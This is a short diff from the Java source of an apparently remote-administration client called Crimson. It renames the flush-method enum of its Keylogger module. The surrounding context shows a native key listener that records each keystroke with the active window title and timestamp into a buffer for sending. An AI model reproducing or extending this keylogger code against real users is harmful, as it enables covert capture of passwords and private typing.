@@ -26,8 +26,8 @@ import org.jnativehook.keyboard.NativeKeyListener;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.client.net.ClientCommands;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.util.Native;
 
@@ -40,9 +40,9 @@ public enum Keylogger {
 	// dont forget to notify this buffer when using event method
 	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>();
 
-	public static RefreshMethod method;
+	public static FLUSH_METHOD method;
 
-	public static void start(RefreshMethod m, int value) {
+	public static void start(FLUSH_METHOD m, int value) {
 		method = m;
 
 		stop();
@@ -112,10 +112,6 @@ public enum Keylogger {
 		return monitor == null ? false : monitor.isAlive();
 	}
 
-	public enum RefreshMethod {
-		TIME, EVENT;
-	}
-
 }
 
 class NKL implements NativeKeyListener {
@@ -135,7 +131,7 @@ class NKL implements NativeKeyListener {
 			Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(e.getWhen()).setTitle(windowTitle)
 					.setEvent((e.getModifiers() == 0 ? "" : "") + e.getKeyChar()).build());
 
-			if (Keylogger.method == RefreshMethod.EVENT) {
+			if (Keylogger.method == FLUSH_METHOD.EVENT) {
 				// notify monitor thread
 				Keylogger.buffer.notifyAll();
 
